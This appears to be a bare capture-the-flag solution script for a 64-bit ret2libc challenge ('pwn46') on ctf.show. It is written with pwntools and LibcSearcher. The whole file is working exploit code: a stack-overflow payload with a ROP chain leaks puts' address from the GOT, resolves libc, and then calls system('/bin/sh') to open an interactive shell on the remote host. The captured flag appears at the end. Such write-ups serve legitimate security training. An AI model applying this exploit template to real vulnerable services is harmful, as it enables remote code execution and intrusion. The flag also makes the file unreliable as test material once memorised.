#pwn46 ret2libc 64
from pwn import *
from LibcSearcher import *

e = ELF("./pwn")
p = remote("pwn.challenge.ctf.show", 28145)

offset = 0x70 + 0x8
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main_addr = e.symbols['main']
rdi_addr = 0x400803
ret = 0x4004fe

payload1 = b'a' * offset + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) + p64(ret)
p.recvuntil("O.o?")
p.sendline(payload1)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

libc = LibcSearcher("puts", puts_addr)
libc_base= puts_addr-libc.dump("puts")
sys_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

p.recvuntil("O.o?")
payload2 = b'a' * offset + p64(rdi_addr) + p64(binsh_addr) + p64(ret) + p64(sys_addr)
p.sendline(payload2)
p.interactive()
#ctfshow{505fab93-b66c-4b39-aabe-250daaa37e3c}